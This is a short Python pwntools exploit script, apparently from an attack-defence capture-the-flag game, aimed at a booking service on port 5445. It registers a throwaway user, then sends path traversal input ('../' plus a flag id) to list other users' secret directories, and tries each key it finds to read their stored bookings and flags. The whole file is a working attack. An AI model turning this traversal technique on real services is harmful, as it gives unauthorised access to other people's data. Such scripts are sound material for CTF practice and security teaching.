from pwn import *
import re
import random


def exploit(target, flag_ids_usernames):
    for flag_id in flag_ids_usernames:
        conn = remote(target, 5445)
        conn.recvuntil(b'2 - No \n\n')

        # create new user
        conn.sendline(b'2')
        conn.recvuntil(b'Please provide a username: (20 chars max)\n')
        gm_name = str(random.randint(0, 99999999999))
        gm_pw = str(random.randint(1000, 100000))
        #self.credentials = gm_name, gm_pw
        conn.send(gm_name.encode())

        conn.recvuntil(b'Provide a password: (20 chars max)\n')
        conn.send(gm_pw.encode())

        conn.recvuntil(b'5 - Exit \n\n')

        conn.sendline(b'3')
        conn.recvuntil(b'To read old bookings please provide the secret key\n')

        # get secret dir of gameserver
        conn.send(b'../' + flag_id.encode())

        
        dir_listing = conn.recvuntil(b'5 - Exit \n\n').decode()
        # todo: regex to get the just a list of directories
        secretkeys = re.findall("[\w]{19}", dir_listing)
        print("[ ] Those possible keys were obtained: ")
        print(secretkeys)
        # iterate through gameservers secretkeys, to find flags
        for secretkey in secretkeys:
                print("[ ] Trying key: {secretkey}".format(secretkey=secretkey))
                conn.sendline(b'3')
                conn.recvuntil(b'To read old bookings please provide the secret key\n')
                conn.send(("../" + flag_id + "/" + secretkey).encode())
                data = conn.recvuntil(b'5 - Exit \n\n')
                print(b'last: '+ data)
                

        conn.close()

if __name__ == '__main__':
    exploit(sys.argv[1], sys.argv[2].split(','))
